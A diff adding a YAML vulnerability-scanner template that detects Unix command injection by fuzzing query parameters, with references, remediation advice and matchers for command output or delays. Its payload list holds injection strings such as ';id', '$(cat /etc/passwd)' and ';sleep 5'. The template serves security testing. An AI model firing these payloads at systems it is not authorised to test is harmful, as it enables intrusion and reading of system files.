@@ -1,0 +1,81 @@
+id: unix-command-injection
+
+info:
+  name: Unix Command Injection - Generic Detection
+  author: Jaenact
+  severity: high
+  description: |
+    Detected potential Unix/Linux OS command injection by replacing query parameter values with shell separator payloads and identifying successful command execution through command output patterns or response time delays. Payloads included semicolons, pipes, logical AND operators, backticks, command substitution, and newline injection.
+  impact: |
+    Successful exploitation allows arbitrary command execution on the underlying operating system, leading to full server compromise, data exfiltration, lateral movement, and denial of service.
+  remediation: |
+    Never pass user-controlled input directly to shell commands. Use parameterized APIs or language-native functions instead of system()/exec(). Apply strict allowlist input validation and enforce least-privilege execution contexts for application processes.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+    - https://cwe.mitre.org/data/definitions/78.html
+    - https://capec.mitre.org/data/definitions/88.html
+    - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-78
+  metadata:
+    verified: true
+    max-request: 15
+  tags: cmdi,dast,rce,unix,linux,fuzz,vuln
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        # shell separators with id
+        - ";id"
+        - "|id"
+        - "&&id"
+        - "`id`"
+        - "$(id)"
+        # file read
+        - ";cat /etc/passwd"
+        - "|cat /etc/passwd"
+        - "$(cat /etc/passwd)"
+        # newline injection
+        - "%0aid"
+        - "%0acat+/etc/passwd"
+        # time-based
+        - ";sleep 5"
+        - "|sleep 5"
+        - "&&sleep 5"
+        - "$(sleep 5)"
+        - "`sleep 5`"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: id-output
+        part: body
+        regex:
+          - 'uid=\d+\([^)]+\)\s+gid=\d+'
+
+      - type: regex
+        name: etc-passwd
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+
+      - type: dsl
+        name: time-based
+        dsl:
+          - 'duration >= 4'
+# digest: 4a0a00473045022100aaf8abfa73f46e605b0bac69b67368f62a6178fc4bb7f5979592dbb8e6edcefc02201ee998c07753af257794d98725fd3fe4fce9f6280770ae5a9bbb52f19fbcc23a:922c64590222798bb761d5b6d8e72950
